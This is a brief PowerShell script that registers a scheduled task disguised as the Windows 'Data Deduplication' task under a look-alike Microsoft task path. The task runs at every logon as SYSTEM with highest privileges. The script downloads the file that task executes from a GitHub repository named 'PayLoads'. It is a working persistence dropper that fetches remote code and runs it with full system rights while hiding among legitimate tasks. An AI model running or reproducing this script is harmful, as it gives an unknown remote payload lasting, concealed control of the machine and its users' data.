$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\temp\script.ps1"'
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -Priority 7 -ExecutionTimeLimit (New-TimeSpan -Hours 4)
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Task = Register-ScheduledTask -TaskName "Data Deduplication" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -TaskPath "\Microsoft\Windows\temmp" -Force -ErrorAction Stop

New-Item -ItemType Directory -Path "C:\temp"

$url2 = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newfolderscript.ps1"
$output2 = "C:\temp\script.ps1"
Invoke-WebRequest -Uri $url2 -OutFile $output2

